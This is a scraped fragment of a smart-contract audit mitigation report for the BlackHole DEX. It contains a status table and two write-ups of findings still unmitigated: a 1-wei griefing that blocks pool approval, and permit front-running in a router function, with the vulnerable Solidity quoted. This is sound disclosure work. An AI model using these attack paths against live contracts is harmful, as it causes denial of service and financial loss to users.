height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMitigation Review Scope \u0026#x26; Summary\u003c/h2\u003e\n\u003cp\u003eDuring the mitigation review, the wardens determined that 2 in-scope findings from the original audit were not fully mitigated. The table below provides details regarding the status of each in-scope vulnerability from the original audit, followed by full details on the in-scope vulnerabilities that were not fully mitigated.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth align=\"center\"\u003eOriginal Issue\u003c/th\u003e\n\u003cth\u003eStatus\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-245\"\u003eH-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-176\"\u003eH-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-17\"\u003eM-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-184\"\u003eM-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-175\"\u003eM-03\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-114\"\u003eM-04\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-122\"\u003eM-05\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🔴 Unmitigated\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-187\"\u003eM-06\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-279\"\u003eM-07\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-324\"\u003eM-08\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-409\"\u003eM-09\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-410\"\u003eM-10\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🔴 Unmitigated\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-74\"\u003eM-11\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-236\"\u003eM-14\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-33\"\u003eM-15\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-406\"\u003eM-16\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-412\"\u003eM-17\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-416\"\u003eM-18\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-419\"\u003eM-19\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-423\"\u003eM-20\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-82\"\u003eM-21\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-220\"\u003eADD-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-83\"\u003eADD-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-05-unmitigated\" style=\"position:relative;\"\u003e\u003ca href=\"#m-05-unmitigated\" aria-label=\"m 05 unmitigated permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40\"\u003e[M-05] Unmitigated\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40\"\u003erayss\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-17\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-57\"\u003emaxvzuvex\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/GenesisPoolManager.sol#L174\"\u003ehttps://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/GenesisPoolManager.sol#L174\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-24\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-24\" aria-label=\"finding description 24 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe S-122 issue’s duplicate S-348 highlights that in the GenesisPool approval process an insecure balance check used during \u003ccode\u003eapproveGenesisPool\u003c/code\u003e. After a whitelisted user calls \u003ccode\u003edepositNativeToken\u003c/code\u003e to initialize a GenesisPool, anyone observing this data can preemptively create the same pair via PairFactory and send a minimal amount (even 1 wei) of the fund\u003ccode\u003eingToken directly to the pair contract. When governance later attempts to approve the pool, the function checks that both the\u003c/code\u003enativeToken\u003ccode\u003eand\u003c/code\u003efundingToken\u003ccode\u003ebalances at the pair address are zero. If either balance is non-zero—due to direct token transfers—the approval fails with a\u003c/code\u003e!ZV` revert. This allows malicious actors to grief or brick the approval process at negligible cost.\u003c/p\u003e\n\u003cp\u003eThe new mitigation in the \u003ccode\u003edepositNativeToken\u003c/code\u003e and \u003ccode\u003eapproveGenesisPool\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003eIn the \u003ccode\u003edepositNativeToken\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"94\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (pairAddress == address(0)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            pairAddress = pairFactory.createPair(nativeToken, _fundingToken, _stable);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        } else {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            require(IERC20(nativeToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            require(IERC20(_fundingToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        pairFactory.setGenesisStatus(pairAddress, true);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the \u003ccode\u003eapproveGenesisPool\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"95\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    require(IERC20(nativeToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);Add commentMore actions\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(IERC20(genesisInfo.fundingToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe issue remains unmitigated even for this (but in a different attack path than the review I stated for S-122). Let’s understand this via a example:\u003c/p\u003e\n\u003cp\u003eUser calls the \u003ccode\u003edepositNativeToken\u003c/code\u003e. The pair address is not created so it enters the if block and calls \u003ccode\u003ecreatePair()\u003c/code\u003e function.\u003c/p\u003e\n\u003cp\u003eNow after this step, the attacker views the transactions in the mempool via a coreth node and sees that a pair has been created, he quickly sends 1 wei to the \u003ccode\u003epairAddress\u003c/code\u003e before the \u003ccode\u003eapproveGenesisPool()\u003c/code\u003e function is called.\u003c/p\u003e\n\u003cp\u003eNow when the \u003ccode\u003eapproveGenesisPool()\u003c/code\u003e is called it has this check:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"96\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  require(IERC20(nativeToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);Add commentMore actions\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(IERC20(genesisInfo.fundingToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhich will revert. Leading to the Dos of the \u003ccode\u003eapproveGenesisPool\u003c/code\u003e. Hence, leading to the issue to be remained unmitigated.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-10-unmitigated\" style=\"position:relative;\"\u003e\u003ca href=\"#m-10-unmitigated\" aria-label=\"m 10 unmitigated permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34\"\u003e[M-10] Unmitigated\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34\"\u003erayss\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-11\"\u003elonelybones\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/RouterV2.sol#L726\"\u003ehttps://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/RouterV2.sol#L726\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-25\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-25\" aria-label=\"finding description 25 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThis issue demonstrates that in the \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e and \u003ccode\u003eremoveLiquidityETHWithPermit()\u003c/code\u003e functions in RouterV2, which unconditionally call \u003ccode\u003epermit()\u003c/code\u003e without proper error handling. This allows an attacker to front-run the permit signature (extracted from the \u003ccode\u003emempool\u003c/code\u003e), causing the original transaction to revert and resulting in gas fee loss for the user.\u003c/p\u003e\n\u003cp\u003eThe new mitigation correctly uses the try and catch method to rectify the issue in the \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e and \u003ccode\u003eremoveLiquidityETHWithPermit()\u003c/code\u003e functions.\u003c/p\u003e\n\u003cp\u003eHowever, this issue still remains unmitigated because the \u003ccode\u003eremoveLiquidityETHWithPermitSupportingFeeOnTransferTokens()\u003c/code\u003e function is not guarded with this logic. It continues to make a direct, unprotected call to \u003ccode\u003epermit()\u003c/code\u003e. As a result, the issue remains unmitigated, since the vulnerability is still exploitable via the \u003ccode\u003eremoveLiquidityETHWithPermitSupportingFeeOnTransferTokens()\u003c/code\u003e function, allowing attackers to front-run and invalidate user transactions.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"97\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address token,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bool stable,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint liquidity,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint amountTokenMin,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint amountETHMin,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address to,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint deadline,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bool approveMax, uint8 v, bytes32 r, bytes32 s\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) external returns (uint amountToken, uint amountETH) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address pair = pairFor(token, address(wETH), stable);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint value = approveMax ? type(uint).max : liquidity;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IBaseV1Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        (amountToken, amountETH) = removeLiquidityETHSupportingFeeOnTransferTokens(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            token, stable, liquidity, amountTokenMin, amountETHMin, to, deadline\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"1a:T21bc,"])</script><script>self.__next_f.push([1,"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#overview\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#about-c4\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#summary\"\u003eSummary\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#governor-findings\"\u003eGovernor findings\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#scope\"\u003eScope\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#severity-criteria\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#high-risk-findings-2\"\u003eHigh Risk Findings (2)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#h-01-router-address-validation-logic-error-prevents-valid-router-assignment\"\u003e[H-01] Router address validation logic error prevents valid router assignment\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone\"\u003e[H-02] Reward token in \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e can be drained by anyone\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#medium-risk-findings-13\"\u003eMedium Risk Findings (13)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca 